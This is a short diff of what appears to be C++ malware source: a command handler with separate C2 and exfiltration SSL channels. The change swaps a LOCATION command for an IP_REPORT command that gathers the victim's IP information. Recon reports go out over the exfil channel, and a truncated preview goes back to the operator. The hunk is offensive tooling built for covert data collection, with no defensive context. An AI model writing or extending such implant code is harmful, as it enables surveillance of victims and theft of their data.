@@ -111,8 +111,8 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
             c2_response = recon_report;
         }
         exfil_data = "=== FULL RECON REPORT ===\n" + recon_report + "\n=== END ===\n";
-    } else if (keyword == "LOCATION") {
-        std::string loc_report = collect_location_info();
+    } else if (keyword == "IP_REPORT") {
+        std::string loc_report = collect_ip_info();
         if (loc_report.length() > C2_PREVIEW_LEN) {
             c2_response = loc_report.substr(0, C2_PREVIEW_LEN) + "\n... [full report in exfil]";
         } else {
